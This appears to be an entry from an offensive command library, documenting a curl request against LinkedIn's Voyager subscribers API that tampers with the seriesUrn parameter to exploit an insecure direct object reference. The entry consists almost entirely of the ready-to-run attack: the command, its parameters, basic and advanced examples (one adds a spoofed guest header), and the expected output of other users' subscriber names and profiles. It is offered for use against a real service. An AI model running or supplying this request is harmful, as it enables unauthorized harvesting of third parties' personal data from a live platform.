---
data: >-
  curl -H "Cookie: li_at=<your-token>; JSESSIONID=<session>"
  "https://www.linkedin.com/voyager/api/voyagerPublishingDashSeriesSubscribers?decorationId=com.linkedin.voyager.dash.deco.publishing.SeriesSubscriberMiniProfile-2&count=10&q=contentSeries&seriesUrn=urn%3Ali%3Afsd_contentSeries%3A<victimId>&start=0"
  -v
tags:
  - api
  - curl
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.230Z'
id: ae832705-e132-4d9b-acb9-adc868d8e3a2
verified: false
validated: true
submitted: true
---
# curl-linkedin-subscribers-request

## Command

```bash
curl -H "Cookie: li_at=<your-token>; JSESSIONID=<session>" "https://www.linkedin.com/voyager/api/voyagerPublishingDashSeriesSubscribers?decorationId=com.linkedin.voyager.dash.deco.publishing.SeriesSubscriberMiniProfile-2&count=10&q=contentSeries&seriesUrn=urn%3Ali%3Afsd_contentSeries%3A<victimId>&start=0" -v
```

## Description

Sends a GET request to LinkedIn's subscribers API with a tampered seriesUrn to exploit IDOR and retrieve unauthorized subscriber data. Use with valid session cookies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: ..."` | Authentication headers with LinkedIn session tokens | Yes |
| `seriesUrn=...` | URL-encoded URN with target NewsletterId | Yes |
| `count=10` | Number of subscribers to return | No |
| `start=0` | Pagination offset | No |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -H "Cookie: li_at=abc123" "https://www.linkedin.com/voyager/api/voyagerPublishingDashSeriesSubscribers?seriesUrn=urn%3Ali%3Afsd_contentSeries%3A123456&count=10" -v
```

### Advanced Usage

```bash
curl -H "Cookie: li_at=abc123; JSESSIONID=def456" -H "X-Li-User: guest" "https://www.linkedin.com/voyager/api/voyagerPublishingDashSeriesSubscribers?decorationId=com.linkedin.voyager.dash.deco.publishing.SeriesSubscriberMiniProfile-2&q=contentSeries&seriesUrn=urn%3Ali%3Afsd_contentSeries%3A789&start=10&count=20" -v
```

## Expected Output

HTTP 200 response with JSON: {"elements": [{"entityUrn": "...", "miniProfile": {"firstName": "...", ...}}], paging info. Errors if unauthorized.

## Related

- [[Related Procedure: Replay-Request-with-Victim-NewsletterId]]
